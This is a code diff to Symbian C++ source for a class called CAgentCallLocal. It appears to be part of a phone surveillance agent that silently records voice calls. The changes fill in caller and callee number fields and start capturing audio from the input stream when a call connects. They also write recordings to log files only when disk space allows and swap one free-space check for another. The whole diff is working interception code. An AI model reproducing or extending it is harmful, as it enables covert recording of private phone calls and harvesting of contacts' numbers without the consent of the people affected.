@@ -25,7 +25,6 @@ CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady)
 
 CAgentCallLocal::~CAgentCallLocal()
 	{
-	delete iFreeSpaceMonitor;
 	delete iCallMonitor;
 	delete iTimer;
 	
@@ -69,9 +68,6 @@ void CAgentCallLocal::ConstructL(const TDesC8& params)
 	ptr += 4;
 	Mem::Copy(&iCompression,ptr,4 );
 	
-	//check quota
-	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
-	iBelowQuota = iFreeSpaceMonitor->IsBelowThreshold();
 	
 	iCallMonitor = CPhoneCallMonitor::NewL(*this);
 	iTimer = CTimeOutTimer::NewL(*this);
@@ -130,7 +126,6 @@ void CAgentCallLocal::StartAgentCmdL()
 			}
 		}
 	iCallMonitor->StartListeningForEvents();
-	iFreeSpaceMonitor->StartListeningForEvents();
 	
 	if(iInputStream)
 	    {
@@ -254,7 +249,7 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 				iVoiceAdditionalData.highStopTime = (filetime >> 32);
 				iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
 				//we have to write log
-				if(!iBelowQuota)
+				if(!iBelowFreespaceQuota)
 					{
 					CLogFile* logFile = CLogFile::NewLC(iFs);
 					logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
@@ -282,12 +277,14 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 			iVoiceAdditionalData.highStopTime = (filetime >> 32);
 			iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
 					
-			CLogFile* logFile = CLogFile::NewLC(iFs);
-			logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
-			logFile->AppendLogL(*iRecData);
-			logFile->CloseLogL();
-			CleanupStack::PopAndDestroy(logFile);
-			
+			if(!iBelowFreespaceQuota)
+				{
+				CLogFile* logFile = CLogFile::NewLC(iFs);
+				logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
+				logFile->AppendLogL(*iRecData);
+				logFile->CloseLogL();
+				CleanupStack::PopAndDestroy(logFile);
+				}
 			iVoiceAdditionalData.highStartTime = (filetime >> 32);
 			iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
 						
@@ -363,19 +360,25 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 		if(aDirection == CTelephony::EMobileOriginated)
 			{
 			//outgoing
-			//iVoiceAdditionalData.uCalleeIdLen = ...
-			//iVoiceAdditionalData.uCallerIdLen = ...
+			iVoiceAdditionalData.uCalleeIdLen = aNumber.Size();
+			iVoiceAdditionalData.uCallerIdLen = 0;
+			iVoiceAdditionalData.uIngoing = 0;
+			//see TSnapshotAdditionalData
 			}
 		else
 			{
 			//incoming
-			//iVoiceAdditionalData.uCalleeIdLen = ...
-			//iVoiceAdditionalData.uCallerIdLen = ...
+			iVoiceAdditionalData.uCalleeIdLen = 0;
+			iVoiceAdditionalData.uCallerIdLen = aNumber.Size(); 
+			iVoiceAdditionalData.uIngoing = 1;
 			}
 		//start recording:
 		//TODO:check recorder ready
-		iInputStream->ReadL(*iStreamBufferArray[0]);
-		iInputStream->ReadL(*iStreamBufferArray[1]);
+		if(iRecState == EReady)
+			{
+			iInputStream->ReadL(*iStreamBufferArray[0]);
+			iInputStream->ReadL(*iStreamBufferArray[1]);
+			}
 		}
 	}
 
@@ -396,15 +399,5 @@ void CAgentCallLocal::TimerExpiredL(TAny* src)
 	{
 	}
 
-
-void CAgentCallLocal::NotifyAboveThreshold()
-	{
-	iBelowQuota = EFalse;
-	}
-
-void CAgentCallLocal::NotifyBelowThreshold()
-	{
-	iBelowQuota = ETrue;
-	}
 
 
